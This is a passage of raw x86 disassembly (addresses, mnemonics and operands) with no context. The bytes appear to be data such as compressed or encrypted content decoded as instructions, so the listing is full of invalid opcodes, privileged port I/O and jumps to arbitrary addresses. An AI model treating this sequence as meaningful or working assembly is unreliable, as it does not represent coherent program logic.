  436f52:	xor    bl,BYTE PTR [ecx]
  436f54:	icebp  
  436f55:	or     BYTE PTR [edx],dh
  436f57:	and    BYTE PTR [ecx],bh
  436f59:	ror    BYTE PTR [edi+0x247b1269],0xbd
  436f60:	popa   
  436f61:	test   DWORD PTR [edi],ecx
  436f63:	cdq    
  436f64:	adc    bh,BYTE PTR [ebx]
  436f66:	or     BYTE PTR [ebp-0x2ad27501],ah
  436f6c:	sbb    al,BYTE PTR [ebp-0x76e85a57]
  436f72:	popa   
  436f73:	dec    edx
  436f74:	adc    eax,DWORD PTR [ebp+0x0]
  436f7a:	add    BYTE PTR [ebx-0x56ccf05b],ch
  436f80:	xchg   edi,eax
  436f81:	xchg   ebx,eax
  436f82:	add    esi,esi
  436f84:	imul   edx,eax,0x1f3225e
  436f8a:	add    BYTE PTR [edx-0x53fbcd7b],dh
  436f90:	sub    BYTE PTR [edx+0x33],ah
  436f93:	inc    DWORD PTR [ebp+0x1e86ffa5]
  436f99:	mov    edi,DWORD PTR gs:[esi+0x31]
  436f9d:	and    eax,DWORD PTR [eax]
  436f9f:	popf   
  436fa0:	mov    ch,0x2b
  436fa2:	dec    esi
  436fa3:	pushf  
  436fa4:	es cmp eax,eax
  436fa7:	jl     0x436fd0
  436fa9:	mov    ds:0x8eb5f957,eax
  436fae:	shrd   edi,esi,cl
  436fb1:	mov    ss,edx
  436fb3:	pop    ebp
  436fb4:	jmp    0x436f45
  436fb6:	rcl    BYTE PTR [eax-0x19daef7d],0x51
  436fbd:	cld    
  436fbe:	in     al,0x93
  436fc0:	pop    eax
  436fc1:	hlt    
  436fc2:	push   DWORD PTR [esi]
  436fc4:	int    0x8b
  436fc6:	add    ecx,DWORD PTR [eax]
  436fc8:	int3   
  436fc9:	adc    al,BYTE PTR [ecx]
  436fcb:	adc    BYTE PTR [esi-0x2e],dl
  436fce:	ja     0x436f67
  436fd0:	pop    esi
  436fd1:	les    esi,FWORD PTR [ebx+edx*4+0x58]
  436fd5:	hlt    
  436fd6:	call   ecx
  436fd8:	fimul  WORD PTR [esi]
  436fda:	test   DWORD PTR [edi+esi*8],edi
  436fdd:	jmp    0x0:0x4c
  436fe4:	arpl   WORD PTR [eax],dx
  436fe6:	(bad)  
  436fe7:	(bad)  
  436fe8:	sbb    al,0x27
  436fea:	cmp    eax,0xb7654f51
  436fef:	stc    
  436ff0:	pop    es
  436ff1:	push   ecx
  436ff2:	lahf   
  436ff3:	bound  edi,QWORD PTR [ecx+0x13021eb2]
  436ff9:	fwait
  436ffa:	adc    al,0x4a
  436ffc:	in     eax,0x8e
  436ffe:	(bad)  
  436fff:	repnz sbb ebx,DWORD PTR [ecx-0x236fae87]
  437006:	mov    cs,WORD PTR [ecx]
  437008:	int3   
  437009:	call   0xc08d:0xd5c4ce8d
  437010:	enter  0xcbd3,0xf9
  437014:	or     eax,edx
  437016:	mov    edi,esi
  437018:	or     BYTE PTR [eax-0x20c4a5a9],dh
  43701e:	jbe    0x437071
  437020:	nop
  437021:	aam    0x8e
  437023:	adc    DWORD PTR [eax+0x33],0xd
  437027:	add    DWORD PTR [edx+0x66],0x11
  43702b:	xchg   DWORD PTR [edx-0x6ffb2ec0],ebp
  437031:	sub    bh,cl
  437033:	and    edx,0xffffffb2
  437036:	dec    ecx
  437037:	sti    
  437038:	jbe    0x436fe2
  43703a:	int3   
  43703b:	stos   BYTE PTR es:[edi],al
  43703c:	jmp    0x2846b7ac
  437041:	test   ch,dh
  437043:	add    dl,BYTE PTR [eax]
  437045:	fadd   st,st(4)
  437047:	in     al,dx
  437048:	add    BYTE PTR [eax],al
  43704a:	add    BYTE PTR [eax],al
  43704c:	add    dh,dl
  43704e:	data16 stc 
  437050:	ret    0x7cf
  437053:	xor    eax,DWORD PTR [eax+edx*4+0x35]
  437057:	xchg   DWORD PTR [edi],ebp
  437059:	mov    esi,0x88c5f73a
  43705e:	mov    dl,0xc8
  437060:	ret    
  437061:	adc    eax,DWORD PTR [ecx]
  437063:	or     ebx,edi
  437065:	es test al,0x9c
  437068:	stos   BYTE PTR es:[edi],al
  437069:	cdq    
  43706a:	imul   esp,edi,0x2
  43706d:	fadd   DWORD PTR [ebx-0x28effd0b]
  437073:	(bad)  
  437074:	in     al,dx
  437075:	xchg   BYTE PTR [esi-0x37],ah
  437078:	ret    0xb7f
  43707b:	mov    ds:0x27359043,eax
  437080:	das    
  437081:	outs   dx,BYTE PTR ds:[esi]
  437082:	cmp    dh,bh
  437084:	lds    ebx,FWORD PTR [eax+0x6c7ea2b2]
  43708a:	or     DWORD PTR [ebx+0x239f17f6],0x79eed37c
  437094:	aad    0xbc
  437096:	xchg   esp,eax
  437097:	mov    BYTE PTR [esi-0x25],bh
  43709a:	ret    0x7eac
  43709d:	mov    ebx,0x13acc0be
  4370a2:	pop    es
  4370a3:	mov    edx,edi
  4370a5:	or     eax,0x507fccb6
  4370aa:	data16 fnstsw WORD PTR [ebx+0x17]
  4370ae:	jb     0x437050
  4370b0:	inc    ecx
  4370b1:	add    BYTE PTR [eax],al
  4370b3:	add    BYTE PTR [eax],al
  4370b5:	add    BYTE PTR [esi+0x65],dl
  4370b8:	push   cs
  4370b9:	add    al,0x86
  4370bb:	outs   dx,DWORD PTR ds:[esi]
  4370bc:	jmp    0x915c:0xc02f4e8e
  4370c3:	jae    0x437121
  4370c5:	mov    eax,ds:0x6913b2be
  4370ca:	shr    dl,cl
  4370cc:	jmp    0xa0b0:0x91baa762
  4370d3:	in     al,dx
  4370d4:	xchg   ebp,eax
  4370d5:	clc    
  4370d6:	pop    ecx
  4370d7:	repz iret 
  4370d9:	in     eax,0x93
  4370db:	popf   
  4370dc:	into   
  4370dd:	pop    ss
  4370de:	cmp    eax,0x80bb90e2
  4370e3:	sahf   
  4370e4:	aas    
  4370e5:	jb     0x43713f
  4370e7:	xchg   esi,eax
  4370e8:	add    bh,BYTE PTR [ecx+eax*2]
  4370eb:	xor    eax,0x958bc56a
  4370f0:	in     eax,0x6c
  4370f2:	lds    esp,FWORD PTR [ebp+0x2]
  4370f5:	out    dx,al
  4370f6:	add    BYTE PTR [edi-0x21f8f0e5],dl
  4370fc:	popa   
  4370fd:	loop   0x4370b0
  4370ff:	xor    DWORD PTR ds:0x57e9536a,esi
  437105:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437106:	lods   eax,DWORD PTR ds:[esi]
  437107:	div    BYTE PTR gs:[esi+0x3b917fce]
  43710e:	scas   eax,DWORD PTR es:[edi]
  43710f:	mov    cl,0x8f
  437111:	push   eax
  437112:	mov    ?,WORD PTR [esi+eiz*4-0x3d]
  437116:	xchg   ebx,eax
  437117:	mov    bl,0x8e
  437119:	cli    
  43711a:	add    BYTE PTR [eax],al
  43711c:	add    BYTE PTR [eax],al
  43711e:	add    BYTE PTR [ebp+0x55],bl
  437121:	xchg   ebp,eax
  437122:	fdivr  DWORD PTR [esi+esi*2-0xe490ece]
  437129:	popa   
  43712a:	jmp    0x4370d6
  43712c:	cdq    
  43712d:	dec    esp
  43712e:	sub    ebp,DWORD PTR [eax]
  437130:	jmp    0x91:0x79f86241
  437137:	pusha  
  437138:	cdq    
  437139:	adc    dh,BYTE PTR [ebx]
  43713b:	mov    ecx,0x348da92d
  437140:	adc    bh,BYTE PTR [esi]
  437142:	call   0x288d9a
  437147:	and    BYTE PTR [eax+0x1b2383ea],0x8f
  43714e:	shr    dh,0xa8
  437151:	aam    0x8b
  437153:	sub    BYTE PTR ds:0x416255a9,ch
  437159:	pop    ebx
  43715a:	test   DWORD PTR [eax],eax
  43715c:	cdq    
  43715d:	adc    dh,BYTE PTR [ebx]
  43715f:	stc    
  437160:	sub    al,0xa9
  437162:	lea    esi,[edx+ebx*1+0x3e]
  437166:	call   0x288d1c
  43716b:	and    ah,BYTE PTR [eax+0x1af383ea]
  437171:	pop    eax
  437173:	mov    esi,0xe88bd4a8
  437178:	sub    al,0xa9
  43717a:	push   ebp
  43717b:	add    al,BYTE PTR [edx+0x59]
  43717e:	push   esi
  43717f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437180:	(bad)  
  437182:	mov    eax,DWORD PTR [eax]
  437184:	add    BYTE PTR [eax],al
  437186:	add    BYTE PTR [eax],al
  437188:	ss push esi
  43718a:	cmp    eax,0x8f356600
  43718f:	leave  
  437190:	inc    esp
  437191:	jmp    0xed884425
  437196:	imul   edi,edx,0xffffffce
  437199:	sbb    ah,ch
  43719b:	jg     0x4371b4
  43719d:	scas   eax,DWORD PTR es:[edi]
  43719e:	xchg   ecx,eax
  43719f:	ret    
  4371a0:	mov    ah,0xf5
  4371a2:	gs xor al,0x40
  4371a5:	nop
  4371a6:	push   ss
  4371a7:	mov    esi,0x4eabc9
  4371ac:	ds test al,0x5f
  4371af:	or     BYTE PTR [edx-0x6f2d710e],ah
  4371b5:	inc    esi
  4371b6:	add    BYTE PTR [edx+0x59],ah
  4371b9:	stc    
  4371ba:	cmp    ah,BYTE PTR [edx]
  4371bc:	fdiv   DWORD PTR [edi+ecx*1]
  4371bf:	add    DWORD PTR [eax],edx
  4371c1:	dec    esi
  4371c2:	test   al,0x9
  4371c4:	dec    esp
  4371c5:	pushf  
  4371c6:	mov    dl,BYTE PTR [esi]
  4371c8:	push   0x77f9b2d9
  4371cd:	test   eax,0xab984365
  4371d2:	mov    dl,BYTE PTR [eax]
  4371d4:	out    0xff,eax
  4371d6:	mov    dl,0xe5
  4371d8:	mov    DWORD PTR [esi-0x40],ecx
  4371db:	je     0x43716a
  4371dd:	in     al,dx
  4371de:	mov    esp,0x540a1962
  4371e3:	pop    edx
  4371e4:	imul   edi,DWORD PTR [esi-0x416ffb30],0x67
  4371eb:	in     al,dx
  4371ec:	add    BYTE PTR [eax],al
  4371ee:	add    BYTE PTR [eax],al
  4371f0:	add    BYTE PTR [ebx],cl
  4371f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4371f3:	out    0x8a,al
  4371f5:	push   ebp
  4371f6:	mov    bl,0x42
  4371f8:	stc    
  4371f9:	sbb    eax,0x9f4f41e7
  4371fe:	mov    ebp,0xe3458502
  437203:	xchg   BYTE PTR [ecx*4+0x535bb369],al
  43720a:	(bad)  
  43720b:	addr16 in al,dx
  43720d:	or     edi,DWORD PTR [edi-0x4e32751a]
  437213:	inc    edx
  437214:	stc    
  437215:	in     eax,0xdd
  437217:	inc    ecx
  437218:	dec    edi
  437219:	addr16 pop es
  43721b:	inc    DWORD PTR [ebp+ecx*8+0x544586d1]
  437222:	jno    0x4371d7
  437224:	pop    ebx
  437225:	push   ebx
  437226:	pop    ebp
  437227:	xchg   BYTE PTR [ebx*8+0xbe76848],cl
  43722e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43722f:	imul   edi,DWORD PTR [esp+ebp*2-0x4e],0x5e3b80e5
  437237:	fild   QWORD PTR [ebx-0x3f]
  43723a:	mov    dl,0xfc
  43723c:	xor    DWORD PTR [edi],0x3f
  43723f:	cmc    
  437240:	add    edx,DWORD PTR [eax-0x58205ec5]
  437246:	cmp    ch,0xb1
  437249:	or     ch,al
  43724b:	jecxz  0x4372c7
  43724d:	add    BYTE PTR [esi],ch
  43724f:	jecxz  0x43727d
  437251:	xchg   ecx,eax
  437252:	sub    ch,BYTE PTR [esp+eax*1]
  437255:	add    BYTE PTR [eax],al
  437257:	add    BYTE PTR [eax],al
  437259:	add    BYTE PTR [ecx-0x4ad83fce],dl
  43725f:	repnz ins DWORD PTR es:[edi],dx
  437261:	aas    
  437262:	mov    ah,0xc2
  437264:	outs   dx,BYTE PTR ds:[esi]
  437265:	aas    
  437266:	lods   al,BYTE PTR ds:[esi]
  437267:	mov    dh,0x8
  437269:	test   edx,edx
  43726b:	mov    dl,0xf6
  43726d:	add    edx,DWORD PTR [eax-0x46595ccf]
  437273:	out    0x3b,eax
  437275:	sub    BYTE PTR [esi-0x56594bd8],cl
  43727b:	addr16 mov bl,0x3f
  43727e:	ins    BYTE PTR es:[edi],dx
  43727f:	mov    esi,0xa08478f6
  437284:	dec    edx
  437285:	aaa    
  437286:	ins    BYTE PTR es:[edi],dx
  437287:	ret    0x287d
  43728a:	loopne 0x437273
  43728c:	imul   edi,DWORD PTR [edx-0x1c],0xffffff8e
  437290:	lds    edi,FWORD PTR [edi+0x50]
  437293:	pop    esi
  437294:	mov    ds:0x198efca6,eax
  437299:	jnp    0x4372dd
  43729b:	out    0xc0,eax
  43729d:	fbstp  TBYTE PTR [ebx+0x154ea681]
  4372a3:	sti    
  4372a4:	dec    esp
  4372a5:	sbb    al,0x54
  4372a7:	out    0x53,eax
  4372a9:	jp     0x4372f3
  4372ab:	xor    DWORD PTR [ecx+ebp*1],ebp
  4372ae:	nop
  4372af:	scas   eax,DWORD PTR es:[edi]
  4372b0:	push   cs
  4372b1:	imul   eax,DWORD PTR [eax+0x57ad8ebb],0x9d9c0ec3
  4372bb:	sub    eax,0xc56a
  4372c0:	add    BYTE PTR [eax],al
  4372c2:	add    BYTE PTR [ebx-0x9934b33],bl
  4372c8:	bound  ebx,QWORD PTR [edx]
  4372ca:	pusha  
  4372cb:	enter  0x1fb2,0x29
  4372cf:	sub    bh,BYTE PTR [ebx+ebp*4-0x714e6c7d]
  4372d6:	bound  edi,QWORD PTR [edx]
  4372d8:	fidiv  DWORD PTR [ecx-0x6916d167]
  4372de:	scas   al,BYTE PTR es:[edi]
  4372df:	pop    ecx
  4372e0:	mov    WORD PTR [ebx+0x3c],cs
  4372e3:	adc    esi,ebp
  4372e5:	sbb    DWORD PTR [ebx-0x42701924],ebp
  4372eb:	fadd   DWORD PTR [ebx+0x2d2b7243]
  4372f1:	call   0xfed1eb66
  4372f6:	imul   esp,DWORD PTR [edi],0x63
  4372f9:	sbb    BYTE PTR [ecx+0x45],dh
  4372fc:	mov    dl,0x13
  4372fe:	imul   ecx,DWORD PTR [ebx],0x93e90e41
  437304:	sub    eax,0x848bcd5a
  437309:	imul   BYTE PTR [esi]
  43730b:	out    dx,al
  43730c:	call   0x3287e5fb
  437311:	in     al,0x0
  437313:	test   DWORD PTR [esi],ebx
  437315:	inc    ebx
  437316:	jmp    0xef3ad997
  43731b:	and    BYTE PTR [esi],0x95
  43731e:	lods   eax,DWORD PTR ds:[esi]
  43731f:	dec    edi
  437320:	mov    dh,0x95
  437322:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437323:	inc    edi
  437324:	mov    edx,0x683f
  437329:	add    BYTE PTR [eax],al
  43732b:	add    BYTE PTR [esi],bl
  43732d:	mov    bl,0xd
  43732f:	jmp    0x127a4c7
  437334:	push   edi
  437335:	jmp    0x7fe5:0xf86fe6b
  43733c:	add    eax,0x66ffa4ec
  437341:	pcmpgtw mm0,mm6
  437344:	std    
  437345:	add    eax,0xf4a200ff
  43734a:	xchg   esi,eax
  43734b:	dec    esp
  43734c:	dec    ebp
  43734d:	ret    0xc3f6
  437350:	test   BYTE PTR [esi],0xe5
  437353:	mov    esi,DWORD PTR ds:0xb9841b06
  437359:	mov    ds:0x57dff20,al
  43735e:	das    
  43735f:	mov    ebx,DWORD PTR [edi-0x62db9df1]
  437365:	sbb    DWORD PTR [ebx+0x57],0x12f62a62
  43736c:	ret    0xe50e
  43736f:	mov    eax,ecx
  437371:	xor    ch,ah
  437373:	jp     0x43732e
  437375:	out    0x6a,al
  437377:	jne    0x43732d
  437379:	xor    DWORD PTR [edx+0x24],ebp
  43737c:	fnsave [ecx-0x72cde9a1]
  437382:	xor    bl,BYTE PTR [eax]
  437384:	add    cl,BYTE PTR [eax-0x15830071]
  43738a:	xchg   ebx,eax
  43738b:	pop    ebp
  43738c:	test   eax,0xebaae2
  437391:	add    BYTE PTR [eax],al
  437393:	add    BYTE PTR [eax],al
  437395:	mov    bh,0x4e
  437397:	add    BYTE PTR fs:[esi+0x31],bh
  43739b:	xchg   ecx,eax
  43739c:	retf   
  43739d:	and    DWORD PTR [ebx+0x55],ecx
  4373a0:	inc    DWORD PTR [esi]
  4373a2:	imul   ecx,ebp,0x5b
  4373a5:	xchg   DWORD PTR [edi+0x47],ebp
  4373a8:	cmp    DWORD PTR [ebp+0x7908a8dd],0x6a
  4373af:	inc    edx
  4373b0:	and    al,0x90
  4373b2:	shl    DWORD PTR [ebp+0x4c],cl
  4373b5:	lods   al,BYTE PTR ds:[esi]
  4373b6:	iret   
  4373b7:	arpl   WORD PTR [esp+esi*2+0xb],ax
  4373bb:	aas    
  4373bc:	stc    
  4373bd:	mov    esp,0xb9e802af
  4373c2:	popf   
  4373c3:	mov    dl,0xf9
  4373c5:	push   ebx
  4373c6:	push   eax
  4373c7:	pop    ebx
  4373c8:	and    al,0x98
  4373ca:	pusha  
  4373cb:	and    esp,DWORD PTR [esp+ecx*4]
  4373ce:	push   esi
  4373cf:	sub    esp,DWORD PTR [eax+eax*4]
  4373d2:	sub    esi,DWORD PTR [edx-0x7914938c]
  4373d8:	pop    ss
  4373d9:	shrd   DWORD PTR [edx-0x3c48ec43],esi,0x4c
  4373e1:	or     edi,DWORD PTR [edi]
  4373e3:	retf   
  4373e4:	xor    ecx,DWORD PTR [ecx]
  4373e6:	inc    edi
  4373e7:	retf   
  4373e8:	add    edx,DWORD PTR [ebx]
  4373ea:	rcr    BYTE PTR [ecx],1
  4373ec:	outs   dx,BYTE PTR ds:[esi]
  4373ed:	xchg   ebp,eax
  4373ee:	pusha  
  4373ef:	fucomi st,st(0)
  4373f1:	adc    al,0xfe
  4373f3:	scas   al,BYTE PTR es:[edi]
  4373f4:	stc    
  4373f5:	or     eax,edi
  4373f7:	test   BYTE PTR [ebx],0x0
  4373fa:	add    BYTE PTR [eax],al
  4373fc:	add    BYTE PTR [eax],al
  4373fe:	mov    ebx,0x19bfc3d8
  437403:	(bad)  
  437404:	not    BYTE PTR [ebx]
  437406:	adc    eax,0x8201091b
  43740b:	sbb    edi,DWORD PTR [ecx+0xedb9177]
  437411:	jge    0x43743f
  437413:	out    dx,eax
  437414:	sbb    al,BYTE PTR [eax]
  437416:	adc    esi,DWORD PTR [edi-0x616fe80a]
  43741c:	fwait
  43741d:	addr16 cwde 
  43741f:	ret    
  437420:	daa    
  437421:	test   DWORD PTR [ecx],ecx
  437423:	into   
  437424:	adc    ebp,ecx
  437426:	adc    esi,DWORD PTR [esi+0xb901bf6]
  43742c:	push   esi
  43742d:	and    al,0xd0
  43742f:	mov    dl,0xf5
  437431:	lods   al,BYTE PTR ds:[esi]
  437432:	fdiv   DWORD PTR [ecx-0x3eafc0b]
  437438:	pop    es
  437439:	call   0x7f16:0xf8115e77
  437440:	sbb    esp,ebp
  437442:	sub    al,0x5b
  437444:	pop    edi
  437445:	or     edi,DWORD PTR [ebp+esi*4-0x57]
  437449:	das    
  43744a:	je     0x437404
  43744c:	mov    eax,ds:0xd95e6727
  437451:	sti    
  437452:	mov    ds:0x1f05039c,al
  437457:	pop    edi
  437458:	(bad)  
  437459:	fbstp  TBYTE PTR [edi+0x5d]
  43745c:	mov    edx,DWORD PTR [eax-0x63881c33]
  437462:	add    BYTE PTR [eax],al
  437464:	add    BYTE PTR [eax],al
  437466:	add    BYTE PTR [ebx+0x548eb35b],dl
  43746c:	mov    es,ecx
  43746e:	xchg   al,bh
  437470:	mov    al,0x68
  437472:	loopne 0x43748a
  437474:	addr16 jns 0x43744e
  437477:	in     al,dx
  437478:	lods   al,BYTE PTR ds:[esi]
  437479:	jne    0x43745d
  43747b:	jg     0x4374da
  43747d:	cli    
  43747e:	dec    edx
  43747f:	popf   
  437480:	in     eax,0x46
  437482:	call   0x3987:0xef796717
  437489:	xor    eax,ebp
  43748b:	fwait
  43748c:	jae    0x43745e
  43748e:	in     al,0xc
  437490:	jg     0x4374a3
  437492:	in     al,dx
  437493:	pop    si
  437495:	fincstp 
  437497:	and    bh,BYTE PTR [ebx-0x418bb0a0]
  43749d:	rcr    ebp,0xc
  4374a0:	repnz ins DWORD PTR es:[edi],dx
  4374a2:	dec    edi
  4374a3:	mov    ah,0xbe
  4374a5:	pusha  
  4374a6:	dec    edi
  4374a7:	lods   al,BYTE PTR ds:[esi]
  4374a8:	ret    0x47fc
  4374ab:	push   ecx
  4374ac:	cmp    DWORD PTR [esi],ecx
  4374ae:	sub    eax,0xb253bf68
  4374b3:	xor    BYTE PTR [edx+eax*4+0x52],dl
  4374b7:	imul   ebp,DWORD PTR [esi],0xffffffe3
  4374ba:	push   edx
  4374bb:	cs jcxz 0x43746d
  4374bf:	ss call 0xb29bdedf
  4374c5:	push   cs
  4374c6:	jmp    0xee5c1dde
  4374cb:	add    BYTE PTR [eax],al
  4374cd:	add    BYTE PTR [eax],al
  4374cf:	add    BYTE PTR [eax],cl
  4374d1:	es push cs
  4374d3:	jmp    0xdf2d126b
  4374d8:	pop    ss
  4374d9:	push   ds
  4374da:	push   cs
  4374db:	jmp    0xa717a273
  4374e0:	cs and eax,0xdd0ec461
  4374e6:	adc    bl,dh
  4374e8:	pop    ss
  4374e9:	and    cl,BYTE PTR [esi]
  4374eb:	jmp    0xc5961083
  4374f0:	sti    
  4374f1:	mov    ecx,0xb2935391
  4374f6:	push   cs
  4374f7:	not    DWORD PTR [ebx+0x636c1be3]
  4374fd:	mov    dl,0xe
  4374ff:	jmp    0x2975e3bf
  437504:	sub    DWORD PTR [edi],0xb293e993
  43750a:	aam    0x2d
  43750c:	mov    eax,0x9cd20da2
  437511:	gs push 0xd
  437514:	mov    ah,0xe2
  437516:	popa   
  437517:	cli    
  437518:	or     ebx,esp
  43751a:	or     eax,0xe765a21c
  43751f:	out    0x84,al
  437521:	test   DWORD PTR [edi+0x12a3a5ab],edx
  437527:	(bad)  
  437528:	loopne 0x4374c0
  43752a:	pop    edx
  43752b:	add    BYTE PTR [edx+0x40],ah
  43752e:	xchg   ebx,eax
  43752f:	inc    ecx
  437530:	sub    DWORD PTR ds:0xc63,0xe4000000
  43753a:	pop    ds
  43753b:	adc    eax,0xeb6f485
  437540:	add    BYTE PTR [edx+0x7a019348],al
  437546:	not    BYTE PTR [edx-0x1fc69a8f]
  43754c:	jmp    0x522bc3
  437551:	mov    edx,0x4472163f
  437556:	das    
  437557:	push   edx
  437558:	and    al,0x55
  43755a:	cmp    esi,ecx
  43755c:	je     0x43758a
  43755e:	iret   
  43755f:	test   al,0x3b
  437561:	cmc    
  437562:	(bad)  [edx]
  437564:	jne    0x4375ba
  437566:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437567:	xchg   ecx,eax
  437568:	retf   
  437569:	xchg   ecx,eax
  43756a:	xchg   ebx,eax
  43756b:	ss (bad) 
  43756d:	sahf   
  43756e:	cmp    esi,ecx
  437570:	jne    0x437556
  437572:	cs pop edx
  437574:	and    al,0xd5
  437576:	cs stos DWORD PTR es:[edi],eax
  437578:	inc    ecx
  437579:	jo     0x4374fd
  43757b:	xor    ah,BYTE PTR [eax+eiz*1]
  43757e:	jp     0x4375b2
  437580:	dec    eax
  437581:	fidivr WORD PTR [ecx]
  437583:	xchg   DWORD PTR [eax],eax
  437585:	jmp    0x8590073f
  43758a:	out    0xe5,al
  43758c:	inc    esp
  43758d:	xchg   ebp,eax
  43758e:	fisub  WORD PTR [ecx]
  437590:	std    
  437591:	mov    esi,0xfefe9e37
  437596:	adc    bh,BYTE PTR [eax+eax*8]
  437599:	sahf   
  43759a:	je     0x4375e3
  43759c:	pop    ebx
  43759d:	add    BYTE PTR [eax],al
  43759f:	add    BYTE PTR [eax],al
  4375a1:	add    BYTE PTR [edx],bh
  4375a3:	stc    
  4375a4:	cmp    edx,eax
  4375a6:	test   eax,0xb57131b5
  4375ab:	cs inc edx
  4375ad:	and    al,0x90
  4375af:	xchg   edi,eax
  4375b0:	cdq    
  4375b1:	pop    esp
  4375b2:	mov    ah,0xdb
  4375b4:	xchg   ecx,eax
  4375b5:	pop    esi
  4375b6:	xchg   esp,eax
  4375b7:	retf   
  4375b8:	cdq    
  4375b9:	leave  
  4375ba:	stos   DWORD PTR es:[edi],eax
  4375bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4375bc:	push   ss
  4375bd:	and    eax,0x8015267
  4375c2:	sbb    ebp,edx
  4375c4:	xchg   edi,eax
  4375c5:	data16 mov WORD PTR [edx-0x346fff5c],es
  4375cc:	xchg   ecx,eax
  4375cd:	jl     0x43757b
  4375cf:	out    0x10,eax
  4375d1:	jae    0x43762d
  4375d3:	adc    al,0x3
  4375d5:	cmp    al,0xdb
  4375d7:	pop    ds
  4375d8:	icebp  
  4375d9:	inc    esp
  4375da:	(bad)
  4375de:	adc    DWORD PTR [ebx+eax*1],0x17
  4375e2:	(bad)  [esi]
  4375e4:	mov    DWORD PTR [esp+eax*8-0x2b7b2111],0xd324bef7
  4375ef:	iret   
  4375f0:	stc    
  4375f1:	jae    0x4375a7
  4375f3:	sti    
  4375f4:	xchg   edi,eax
  4375f5:	call   FWORD PTR [eax]
  4375f7:	pop    edx
  4375f8:	adc    esp,ebp
  4375fa:	mov    dl,0x64
  4375fc:	sub    esp,DWORD PTR [eax+eiz*4]
  4375ff:	push   esp
  437600:	push   ebx
  437601:	and    al,0xbc
  437603:	hlt    
  437604:	push   ecx
  437605:	add    al,0x0
  437607:	add    BYTE PTR [eax],al
  437609:	add    BYTE PTR [eax],al
  43760b:	sbb    edx,ecx
  43760d:	xchg   edi,eax
  43760e:	inc    esp
  43760f:	mov    ah,0x93
  437611:	test   DWORD PTR [ebx-0x54],0x1908b7b7
  437618:	retf   0x4497
  43761b:	ins    BYTE PTR es:[edi],dx
  43761c:	fcomip st,st(7)
  43761e:	mov    ebp,0x2d168a09
  437623:	shl    cl,1
  437625:	push   ecx
  437626:	add    al,0x9f
  437628:	jo     0x4375fc
  43762a:	out    0x1d,eax
  43762c:	mov    dl,0xb4
  43762e:	lahf   
  43762f:	cdq    
  437630:	xor    DWORD PTR [ecx],ecx
  437632:	call   0x38b4288a
  437637:	mov    ah,0x6e
  437639:	add    DWORD PTR [edi],esi
  43763b:	or     eax,0x44f7d977
  437640:	loopne 0x437636
  437642:	add    edx,DWORD PTR [eax+0x75052d2d]
  437648:	leave  
  437649:	outs   dx,DWORD PTR ds:[esi]
  43764a:	add    eax,0xec992a4
  43764f:	pushf  
  437650:	test   eax,0xad9407c9
  437655:	ret    
  437656:	push   es
  437657:	cdq    
  437658:	and    BYTE PTR ds:0xf26604db,dh
  43765e:	inc    esp
  43765f:	test   eax,esi
  437661:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437662:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437663:	sub    eax,0x6c066fc9
  437668:	xchg   edx,eax
  437669:	mov    eax,ds:0xb1a9640e
  43766e:	pop    es
  43766f:	add    BYTE PTR [eax],al
  437671:	add    BYTE PTR [eax],al
  437673:	add    BYTE PTR [ebp+ebp*4-0x75],bl
  437677:	push   es
  437678:	mov    DWORD PTR [eax],esp
  43767a:	xor    eax,0xf2664cdb
  43767f:	dec    ebp
  437680:	mov    ebp,0x15a567e1
  437685:	jg     0x437658
  437687:	repz or al,0xf2
  43768a:	iret   
  43768b:	inc    edx
  43768c:	xchg   esp,eax
  43768d:	mov    esp,esi
  43768f:	inc    ebp
  437690:	lgs    ebx,FWORD PTR [esi+0x11]
  437694:	xchg   esp,eax
  437695:	retf   
  437696:	lock mov dh,BYTE PTR [esi+edx*4]
  43769a:	in     eax,0x8a
  43769c:	push   esp
  43769d:	xchg   esi,eax
  43769e:	or     eax,0xb684eb
  4376a3:	and    BYTE PTR [edx+ecx*4+0x5e],dh
  4376a7:	inc    ecx
  4376a8:	mov    BYTE PTR [ecx],ch
  4376aa:	push   cs
  4376ab:	xor    eax,DWORD PTR [eax-0x13ff2de]
  4376b1:	fsub   st(2),st
  4376b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4376b4:	gs xor eax,0xae4572dd
  4376ba:	xchg   ecx,eax
  4376bb:	mov    al,ds:0x15ebc5a7
  4376c0:	js     0x437679
  4376c2:	idiv   BYTE PTR [esi+eax*4-0x26]
  4376c6:	jmp    0x53bb:0x12635364
  4376cd:	aad    0xa
  4376cf:	(bad)  
  4376d0:	int    0xae
  4376d2:	xchg   edi,eax
  4376d3:	jmp    0x5255eae4
  4376d8:	add    BYTE PTR [eax],al
  4376da:	add    BYTE PTR [eax],al
  4376dc:	add    BYTE PTR [edx+0x36],ah
  4376df:	inc    esp
  4376e0:	loope  0x437674
  4376e2:	xchg   BYTE PTR [edx],dh
  4376e4:	loope  0x437706
  4376e6:	ins    BYTE PTR es:[edi],dx
  4376e7:	adc    dl,BYTE PTR [ecx-0x30]
  4376ea:	outs   dx,BYTE PTR ds:[esi]
  4376eb:	jmp    0x43772b
  4376ed:	pslld  mm4,QWORD PTR [ecx+0x16]
  4376f1:	ret    
  4376f2:	fisttp WORD PTR [eax+0x2b]
  4376f5:	(bad)  
  4376f6:	mov    dl,0x8f
  4376f8:	adc    eax,0xc5122c23
  4376fd:	bound  eax,QWORD PTR [edx-0x4d461688]
  437703:	js     0x4376eb
  437705:	sbb    al,BYTE PTR [edi]
  437707:	test   BYTE PTR [esi],0x1f
  43770a:	fldl2e 
  43770c:	shr    DWORD PTR gs:[eax-0x4d6cac6e],cl
  437713:	push   cs
  437714:	xchg   esi,eax
  437715:	sbb    bl,BYTE PTR [esi+0x32]
  437718:	adc    DWORD PTR [edi],edx
  43771a:	fldenv [edx+esi*8+0x8]
  43771e:	outs   dx,BYTE PTR ds:[esi]
  43771f:	xor    cl,BYTE PTR ds:0xcee85efc
  437725:	and    eax,0x4200e635
  43772a:	push   0x32
  43772c:	and    BYTE PTR [edx-0x730070e0],bh
  437732:	das    
  437733:	push   ebp
  437734:	add    esi,eax
